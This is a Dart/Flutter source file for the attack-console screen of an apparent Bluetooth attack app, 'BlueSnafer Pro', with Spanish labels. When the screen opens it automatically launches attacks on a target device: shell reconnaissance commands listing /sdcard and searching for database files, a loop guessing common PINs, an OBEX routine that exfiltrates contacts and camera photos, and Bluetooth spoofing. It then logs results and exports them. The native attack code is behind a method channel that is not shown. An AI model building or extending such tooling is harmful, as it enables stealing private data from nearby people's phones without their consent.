import 'dart:async';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:path_provider/path_provider.dart';
import 'utils/device_utils.dart' as device_utils;

/// Pantalla de consola para mostrar ejecución de ataques en tiempo real
class AttackConsoleScreen extends StatefulWidget {
  final Map<String, dynamic> device;
  final String attackType;
  final Map<String, dynamic>? attackOptions;

  const AttackConsoleScreen({
    super.key,
    required this.device,
    required this.attackType,
    this.attackOptions,
  });

  @override
  State<AttackConsoleScreen> createState() => _AttackConsoleScreenState();
}

class _AttackConsoleScreenState extends State<AttackConsoleScreen> {
  static const platform = MethodChannel('com.bluesnafer_pro/bluetooth');
  static const logChannel = EventChannel('bluetooth_logs');

  StreamSubscription<dynamic>? _logSubscription;

  List<String> _consoleLogs = [];
  bool _isExecuting = false;
  double _progress = 0.0;
  String _currentStatus = 'Preparando ataque...';
  String _logFileName = '';

  @override
  void initState() {
    super.initState();
    _setupLogFileName();
    _loadPersistedLogs();
    _initializeConsole();
    _startAttack();
  }

  void _setupLogFileName() {
    final now = DateTime.now();
    _logFileName = 'console_${now.year}-${now.month.toString().padLeft(2, '0')}-${now.day.toString().padLeft(2, '0')}.txt';
  }

  Future<void> _loadPersistedLogs() async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final logFile = File('${directory.path}/bluesnafer_logs/$_logFileName');
      if (await logFile.exists()) {
        final content = await logFile.readAsString();
        if (content.isNotEmpty) {
          setState(() {
            _consoleLogs = content.split('\n').where((line) => line.isNotEmpty).toList();
          });
        }
      }
    } catch (e) {
      print('Error cargando logs persistidos: $e');
    }
  }

  Future<void> _saveLogsToFile() async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final logDir = Directory('${directory.path}/bluesnafer_logs');
      if (!await logDir.exists()) {
        await logDir.create(recursive: true);
      }
      final logFile = File('${logDir.path}/$_logFileName');
      await logFile.writeAsString(_consoleLogs.join('\n'));
    } catch (e) {
      print('Error guardando logs: $e');
    }
  }

  @override
  void dispose() {
    _logSubscription?.cancel();
    super.dispose();
  }

  void _initializeConsole() {
    _logSubscription = logChannel.receiveBroadcastStream().listen((logMessage) {
      setState(() {
        _consoleLogs.add(logMessage.toString());
      });
      _saveLogsToFile();
    });
  }

  Future<void> _startAttack() async {
    setState(() {
      _isExecuting = true;
      _progress = 0.0;
    });

    try {
      await platform.invokeMethod('analyzeDevice', {
        'deviceAddress': widget.device['address'],
      });
      await _executeAttack();
    } catch (e) {
      setState(() {
        _consoleLogs.add('❌ Error al iniciar ataque: $e');
        _isExecuting = false;
      });
    }
  }

  Future<void> _executeAttack() async {
    try {
      switch (widget.attackType) {
        case 'file_access':
          await _executeFileAccessAttack();
          break;
        case 'pin_bypass':
          await _executePinBypassAttack();
          break;
        case 'obex_exploit':
          await _executeOBEXExploit();
          break;
        case 'bluetooth_spoofing':
          await _executeBluetoothSpoofing();
          break;
        default:
          await _executeGenericAttack();
      }
      setState(() {
        _isExecuting = false;
      });
    } catch (e) {
      setState(() {
        _consoleLogs.add('❌ Error durante ejecución: $e');
        _isExecuting = false;
      });
    }
  }

  Future<void> _executeFileAccessAttack() async {
    final commands = [
      'ls -la /sdcard',
      'find /sdcard -name "*.db" -o -name "*.sqlite" | head -10',
      'cat /proc/version',
      'id',
    ];
    for (final cmd in commands) {
      try {
        await platform.invokeMethod('executeCommand', {
          'deviceAddress': widget.device['address'],
          'command': cmd,
        });
        await Future.delayed(const Duration(milliseconds: 500));
      } catch (e) {
        _consoleLogs.add('⚠️ Error en comando $cmd: $e');
      }
    }
  }

  Future<void> _executePinBypassAttack() async {
    final bypassAttempts = ['0000', '1111', '1234', '9999', '000000'];
    for (final pin in bypassAttempts) {
      try {
        final result = await platform.invokeMethod('checkVulnerability', {
          'deviceAddress': widget.device['address'],
          'vulnerabilityCheck': 'PIN_BYPASS:$pin',
        });
        if (result.toString().contains('VULNERABLE')) {
          _consoleLogs.add('✅ PIN encontrado: $pin');
          break;
        } else {
          _consoleLogs.add('❌ PIN $pin incorrecto');
        }
        await Future.delayed(const Duration(milliseconds: 300));
      } catch (e) {
        _consoleLogs.add('⚠️ Error intentando PIN $pin: $e');
      }
    }
  }

  Future<void> _executeOBEXExploit() async {
    try {
      await platform.invokeMethod('enumerateFiles', {
        'deviceAddress': widget.device['address'],
        'path': '/sdcard',
      });
      await platform.invokeMethod('exfiltrateMultipleFiles', {
        'deviceAddress': widget.device['address'],
        'fileMap': {
          '/sdcard/Download/contacts.vcf': '/tmp/contacts_exfiltrated.vcf',
          '/sdcard/DCIM/Camera/photo.jpg': '/tmp/photo_exfiltrated.jpg',
        }
      });
    } catch (e) {
      _consoleLogs.add('❌ Error en exploit OBEX: $e');
    }
  }

  Future<void> _executeBluetoothSpoofing() async {
    try {
      await platform.invokeMethod('executeCommand', {
        'deviceAddress': widget.device['address'],
        'command': 'bluetoothctl -- spoof ${widget.device['address']} new_device',
      });
    } catch (e) {
      _consoleLogs.add('❌ Error en spoofing: $e');
    }
  }

  Future<void> _executeGenericAttack() async {
    try {
      await platform.invokeMethod('executeCommand', {
        'deviceAddress': widget.device['address'],
        'command': 'whoami && uname -a && df -h',
      });
    } catch (e) {
      _consoleLogs.add('❌ Error en ataque genérico: $e');
    }
  }

  Future<void> _exportLogsToPC() async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final logDir = Directory('${directory.path}/bluesnafer_logs');
      
      if (!await logDir.exists() || _consoleLogs.isEmpty) {
        setState(() {
          _consoleLogs.add('❌ No hay logs para exportar');
        });
        return;
      }

      String allLogs = "=== BLUESNAFER PRO - LOGS DE CONSOLA ===\n";
      allLogs += "Fecha: ${DateTime.now()}\n";
      allLogs += "Dispositivo: ${device_utils.getDeviceDisplayName(widget.device)}\n";
      allLogs += "Tipo de ataque: ${widget.attackType}\n";
      allLogs += "${"=" * 50}\n\n";
      allLogs += _consoleLogs.join('\n');

      final downloadDir = Directory('/storage/emulated/0/Download');
      if (await downloadDir.exists()) {
        final exportFile = File('${downloadDir.path}/bluesnafer_console_${DateTime.now().millisecondsSinceEpoch}.txt');
        await exportFile.writeAsString(allLogs);
        setState(() {
          _consoleLogs.add('✅ Logs exportados a: ${exportFile.path}');
          _consoleLogs.add('   Copia el archivo a tu PC desde la carpeta Download');
        });
      } else {
        final externalDir = Directory('/storage/emulated/0');
        if (await externalDir.exists()) {
          final exportFile = File('${externalDir.path}/bluesnafer_console_${DateTime.now().millisecondsSinceEpoch}.txt');
          await exportFile.writeAsString(allLogs);
          setState(() {
            _consoleLogs.add('✅ Logs exportados a: ${exportFile.path}');
          });
        } else {
          setState(() {
            _consoleLogs.add('❌ No se puede acceder al almacenamiento externo');
          });
        }
      }
    } catch (e) {
      setState(() {
        _consoleLogs.add('❌ Error exportando: $e');
      });
    }
  }

  void _retryAttack() {
    setState(() {
      _consoleLogs.clear();
    });
    _startAttack();
  }

  void _stopAttack() {
    setState(() {
      _isExecuting = false;
      _consoleLogs.add('🛑 Ataque detenido por el usuario');
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF0A0E21),
      appBar: AppBar(
        title: Text('Consola - ${device_utils.getDeviceDisplayName(widget.device)}'),
        backgroundColor: const Color(0xFF1D1E33),
        elevation: 0,
        actions: [
          if (!_isExecuting)
            IconButton(
              icon: const Icon(Icons.refresh, color: Colors.green),
              onPressed: _retryAttack,
              tooltip: 'Reintentar',
            ),
        ],
      ),
      body: Column(
        children: [
          _buildStatusCard(),
          Expanded(
            child: Container(
              margin: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: Colors.black,
                borderRadius: BorderRadius.circular(8),
                border: Border.all(color: Colors.grey[700]!),
              ),
              child: Column(
                children: [
                  _buildConsoleHeader(),
                  Expanded(
                    child: _buildConsoleContent(),
                  ),
                  if (_isExecuting) _buildProgressBar(),
                ],
              ),
            ),
          ),
          _buildActionButtons(),
        ],
      ),
    );
  }

  Widget _buildStatusCard() {
    return Container(
      margin: const EdgeInsets.all(16),
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: _isExecuting ? Colors.orange.withValues(alpha: 0.1) : Colors.green.withValues(alpha: 0.1),
        borderRadius: BorderRadius.circular(8),
        border: Border.all(
          color: _isExecuting ? Colors.orange : Colors.green,
        ),
      ),
      child: Row(
        children: [
          Icon(
            _isExecuting ? Icons.warning : Icons.check_circle,
            color: _isExecuting ? Colors.orange : Colors.green,
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  _isExecuting ? 'Ejecutando ataque...' : 'Ataque completado',
                  style: TextStyle(
                    color: _isExecuting ? Colors.orange : Colors.green,
                    fontWeight: FontWeight.bold,
                  ),
                ),
                Text(
                  _currentStatus,
                  style: TextStyle(
                    color: _isExecuting ? Colors.orange : Colors.green,
                    fontSize: 12,
                  ),
                ),
              ],
            ),
          ),
          if (_isExecuting)
            const SizedBox(
              width: 20,
              height: 20,
              child: CircularProgressIndicator(
                strokeWidth: 2,
                color: Colors.orange,
              ),
            ),
        ],
      ),
    );
  }

  Widget _buildConsoleHeader() {
    return Container(
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: const Color(0xFF1D1E33),
        borderRadius: const BorderRadius.only(
          topLeft: Radius.circular(8),
          topRight: Radius.circular(8),
        ),
        border: Border(
          bottom: BorderSide(
            color: Colors.white.withValues(alpha: 0.1),
            width: 1,
          ),
        ),
      ),
      child: Row(
        children: [
          Container(
            padding: const EdgeInsets.all(6),
            decoration: BoxDecoration(
              color: Colors.green.withValues(alpha: 0.2),
              borderRadius: BorderRadius.circular(6),
            ),
            child: const Icon(Icons.terminal, color: Colors.green, size: 16),
          ),
          const SizedBox(width: 8),
          const Text(
            'CONSOLA DE EJECUCIÓN',
            style: TextStyle(
              color: Colors.white,
              fontWeight: FontWeight.bold,
              fontSize: 14,
            ),
          ),
          const Spacer(),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
            decoration: BoxDecoration(
              color: Colors.white.withValues(alpha: 0.1),
              borderRadius: BorderRadius.circular(12),
            ),
            child: Text(
              '${_consoleLogs.length} líneas',
              style: const TextStyle(color: Colors.white70, fontSize: 11),
            ),
          ),
          const SizedBox(width: 8),
          IconButton(
            icon: const Icon(Icons.save_alt, color: Colors.blue, size: 20),
            onPressed: _exportLogsToPC,
            tooltip: 'Exportar a TXT para PC',
            padding: EdgeInsets.zero,
            constraints: const BoxConstraints(),
          ),
          const SizedBox(width: 8),
          if (_isExecuting)
            IconButton(
              icon: const Icon(Icons.stop, color: Colors.red, size: 20),
              onPressed: _stopAttack,
              tooltip: 'Detener',
              padding: EdgeInsets.zero,
              constraints: const BoxConstraints(),
            ),
        ],
      ),
    );
  }

  Widget _buildConsoleContent() {
    if (_consoleLogs.isEmpty) {
      return const Center(
        child: Text(
          'Esperando logs...\nEl ataque comenzará automáticamente.',
          style: TextStyle(color: Colors.grey, fontSize: 14),
          textAlign: TextAlign.center,
        ),
      );
    }

    return ListView.builder(
      padding: const EdgeInsets.all(12),
      itemCount: _consoleLogs.length,
      itemBuilder: (context, index) {
        final log = _consoleLogs[index];
        return Container(
          padding: const EdgeInsets.symmetric(vertical: 2),
          child: Text(
            log,
            style: TextStyle(
              color: _getLogColor(log),
              fontSize: 12,
              fontFamily: 'monospace',
            ),
          ),
        );
      },
    );
  }

  Widget _buildProgressBar() {
    return Container(
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: const Color(0xFF1D1E33),
        borderRadius: const BorderRadius.only(
          bottomLeft: Radius.circular(8),
          bottomRight: Radius.circular(8),
        ),
        border: Border(
          top: BorderSide(
            color: Colors.white.withValues(alpha: 0.1),
            width: 1,
          ),
        ),
      ),
      child: Column(
        children: [
          LinearProgressIndicator(
            value: _progress > 0 ? _progress : null,
            backgroundColor: Colors.grey[800],
            valueColor: const AlwaysStoppedAnimation<Color>(Colors.green),
            minHeight: 6,
          ),
          const SizedBox(height: 8),
          Row(
            children: [
              Container(
                width: 8,
                height: 8,
                decoration: const BoxDecoration(
                  color: Colors.green,
                  borderRadius: BorderRadius.all(Radius.circular(4)),
                ),
              ),
              const SizedBox(width: 8),
              Expanded(
                child: Text(
                  _currentStatus,
                  style: const TextStyle(
                    color: Colors.white,
                    fontSize: 12,
                    fontWeight: FontWeight.w500,
                  ),
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildActionButtons() {
    if (_isExecuting) return const SizedBox.shrink();
    
    return Container(
      padding: const EdgeInsets.all(16),
      child: Row(
        children: [
          Expanded(
            child: ElevatedButton.icon(
              onPressed: _retryAttack,
              icon: const Icon(Icons.play_arrow, size: 20),
              label: const Text(
                'REINTENTAR',
                style: TextStyle(fontSize: 14, fontWeight: FontWeight.bold),
              ),
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.green,
                padding: const EdgeInsets.symmetric(vertical: 12),
                shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(8),
                ),
              ),
            ),
          ),
          const SizedBox(width: 16),
          Expanded(
            child: ElevatedButton.icon(
              onPressed: _exportLogsToPC,
              icon: const Icon(Icons.file_download, size: 20),
              label: const Text(
                'EXPORTAR TXT',
                style: TextStyle(fontSize: 14, fontWeight: FontWeight.bold),
              ),
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.blue,
                padding: const EdgeInsets.symmetric(vertical: 12),
                shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(8),
                ),
              ),
            ),
          ),
          const SizedBox(width: 16),
          Expanded(
            child: OutlinedButton.icon(
              onPressed: () => Navigator.of(context).pop(),
              icon: const Icon(Icons.close, size: 20),
              label: const Text(
                'CERRAR',
                style: TextStyle(fontSize: 14, fontWeight: FontWeight.bold),
              ),
              style: OutlinedButton.styleFrom(
                foregroundColor: Colors.white70,
                side: const BorderSide(color: Colors.white70, width: 1.5),
                padding: const EdgeInsets.symmetric(vertical: 12),
                shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(8),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Color _getLogColor(String log) {
    if (log.contains('✅') || log.contains('SUCCESS')) return Colors.green;
    if (log.contains('❌') || log.contains('ERROR') || log.contains('FAIL')) return Colors.red;
    if (log.contains('⚠️') || log.contains('WARNING')) return Colors.amber;
    if (log.contains('ℹ️')) return Colors.blue;
    return Colors.white;
  }
}
